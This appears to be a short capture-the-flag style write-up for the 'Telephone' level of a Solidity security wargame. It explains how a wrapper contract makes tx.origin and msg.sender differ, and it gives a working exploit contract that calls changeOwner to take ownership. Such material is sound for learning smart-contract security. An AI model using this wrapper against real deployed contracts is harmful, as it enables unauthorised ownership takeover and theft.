### Analysis
If you directly call changeOwner then tx.origin == msg.sender. But by creating a wrapper contract to call changeOwner on your behalf, you set these two globals to different values: tx.origin is your address, because you initiated the overall sequence of transactions. msg.sender is the wrapper smart contract, because the wrapper is the one that directly calls changeOwner.

### The Exploit
call the function of changeTelephoneOwner after deployed.
~~~
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface Telephone{
    function changeOwner(address _owner) external;
}

contract TelephoneWrapper{
    function changeTelephoneOwner(address _telephone,address _owner) public{
        Telephone(_telephone).changeOwner(_owner);
    }
}
~~~